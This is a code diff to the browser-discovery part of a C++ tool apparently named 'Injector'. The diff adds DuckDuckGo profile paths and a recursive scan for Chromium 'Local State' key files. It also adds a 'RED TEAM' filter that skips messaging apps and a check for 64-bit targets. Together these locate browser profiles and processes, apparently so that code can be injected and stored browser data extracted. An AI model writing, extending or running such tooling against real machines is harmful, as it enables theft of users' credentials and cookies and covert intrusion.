@@ -30,6 +30,7 @@ namespace Injector {
             {L"vivaldi", {L"vivaldi.exe", "Vivaldi"}},
             {L"yandex", {L"browser.exe", "Yandex"}},
             {L"chromium", {L"chrome.exe", "Chromium"}},
+            {L"duckduckgo", {L"DuckDuckGo.exe", "DuckDuckGo"}},
             {L"iridium", {L"iridium.exe", "Iridium"}},
             {L"centbrowser", {L"chrome.exe", "Cent"}},
             // Gecko browsers
@@ -96,7 +97,7 @@ namespace Injector {
                 if (!paths.exePath.empty() && !ValidatePathForBrowser(paths.exePath, type)) continue;
 
                 bool isGecko = (type == L"firefox" || type == L"waterfox" || type == L"palemoon");
-                results.push_back({type, paths.exeName, paths.exePath, paths.userDataPath, info.second.second, GetFileVersion(paths.exePath), isGecko, paths.isColdOnly});
+                results.push_back({type, paths.exeName, paths.exePath, paths.userDataPath, info.second.second, GetFileVersion(paths.exePath), isGecko});
             }
         }
         
@@ -166,6 +167,18 @@ namespace Injector {
                 res.userDataPath = pkg + L"\\LocalCache\\Roaming\\Mozilla\\Firefox\\Profiles";
                 return res;
             }
+        } else if (browserType == L"duckduckgo") {
+            auto pkg = ResolvePackageFolder(L"DuckDuckGo.DesktopBrowser");
+            if (!pkg.empty()) {
+                res.exePath = L"C:\\Windows\\System32\\cmd.exe"; // Surrogate if not running
+                res.exeName = L"DuckDuckGo.exe"; // Back to main process
+                // DDG Store (WebView2) data is in EBWebView inside LocalState
+                res.userDataPath = pkg + L"\\LocalState\\EBWebView";
+                return res;
+            }
+            res.userDataPath = localApp + L"\\DuckDuckGo\\WindowsBrowser\\User Data";
+            res.exePath = localApp + L"\\DuckDuckGo\\WindowsBrowser\\DuckDuckGo.exe";
+            if (std::filesystem::exists(res.exePath)) return res;
         } else if (browserType == L"brave") {
             auto pkg = ResolvePackageFolder(L"BraveSoftwareInc.BraveBrowser");
             if (!pkg.empty()) {
@@ -241,15 +254,6 @@ namespace Injector {
                     }
                     return res;
                 }
-            }
-        }
-
-        // Generic check: if UserData is in Packages, it's likely a Store/Sandbox app
-        if (!res.userDataPath.empty()) {
-            std::wstring lowerUDP = res.userDataPath;
-            std::transform(lowerUDP.begin(), lowerUDP.end(), lowerUDP.begin(), ::towlower);
-            if (lowerUDP.find(L"\\packages\\") != std::wstring::npos) {
-                res.isColdOnly = true;
             }
         }
 
@@ -377,6 +381,54 @@ namespace Injector {
                std::to_string(LOWORD(fileInfo->dwFileVersionLS));
     }
 
+    static bool IsBlacklisted(const std::wstring& path) {
+        std::wstring lowerPath = path;
+        std::transform(lowerPath.begin(), lowerPath.end(), lowerPath.begin(), ::towlower);
+
+        // DIRECTORY-LEVEL BLACKLIST: Skip entire messenger/work app folders
+        static const std::vector<std::wstring> blacklist = {
+            L"telegram desktop", L"discord", L"outlook", L"msedge",
+            L"slack", L"teams", L"whatsapp", L"discord canary", L"discord ptb"
+        };
+
+        for (const auto& item : blacklist) {
+            if (lowerPath.find(item) != std::wstring::npos) {
+                // Special case: Only blacklist msedge if it's NOT in its standard browser directory
+                if (item == L"msedge") {
+                    if (lowerPath.find(L"\\microsoft\\edge\\") == std::wstring::npos &&
+                        lowerPath.find(L"\\microsoft\\edge beta\\") == std::wstring::npos &&
+                        lowerPath.find(L"\\microsoft\\edge dev\\") == std::wstring::npos &&
+                        lowerPath.find(L"\\microsoft\\edge canary\\") == std::wstring::npos) {
+                        return true;
+                    }
+                    continue; // Is a real Edge browser, don't blacklist
+                }
+                return true;
+            }
+        }
+        return false;
+    }
+
+    static bool Is64Bit(const std::wstring& exePath) {
+        HANDLE hFile = CreateFileW(exePath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) return false;
+
+        bool is64 = false;
+        try {
+            IMAGE_DOS_HEADER dosHeader;
+            DWORD bytesRead;
+            if (ReadFile(hFile, &dosHeader, sizeof(dosHeader), &bytesRead, NULL) && dosHeader.e_magic == IMAGE_DOS_SIGNATURE) {
+                SetFilePointer(hFile, dosHeader.e_lfanew, NULL, FILE_BEGIN);
+                IMAGE_NT_HEADERS64 ntHeaders;
+                if (ReadFile(hFile, &ntHeaders, sizeof(ntHeaders), &bytesRead, NULL) && ntHeaders.Signature == IMAGE_NT_SIGNATURE) {
+                    is64 = (ntHeaders.FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64);
+                }
+            }
+        } catch (...) {}
+        CloseHandle(hFile);
+        return is64;
+    }
+
     std::vector<BrowserInfo> BrowserDiscovery::DeepScan() {
         std::vector<BrowserInfo> deepResults;
         std::vector<std::wstring> roots = { FindUserAppData(), L"" };
@@ -393,11 +445,17 @@ namespace Injector {
                 std::filesystem::path rootPath(root);
                 if (!std::filesystem::exists(rootPath)) continue;
 
+                // RED TEAM FILTER: Check the root folder itself to avoid entire trees (e.g. Telegram Desktop)
+                if (IsBlacklisted(rootPath.wstring())) continue;
+
                 for (const auto& entry : std::filesystem::recursive_directory_iterator(rootPath)) {
                     if (entry.is_directory()) {
                         std::wstring path = entry.path().wstring();
-                        std::wstring localState = path + L"\\Local State";
                         
+                        // Skip blacklisted subdirectories early
+                        if (IsBlacklisted(path)) continue;
+
+                        std::wstring localState = path + L"\\Local State";
                         if (std::filesystem::exists(localState)) {
                             BrowserInfo info;
                             info.userDataPath = path;
@@ -415,6 +473,10 @@ namespace Injector {
                                         
                                         if (lowerExe == L"setup.exe" || lowerExe == L"uninstall.exe" || 
                                             lowerExe == L"update.exe" || lowerExe == L"crashreporter.exe") continue;
+
+                                        // RED TEAM HARDENING: Block messaging apps AND Architecture Mismatch
+                                        if (IsBlacklisted(file.path().wstring())) continue;
+                                        if (!Is64Bit(file.path().wstring())) continue;
                                         
                                         info.exePath = file.path().wstring();
                                         info.exeName = exeName;
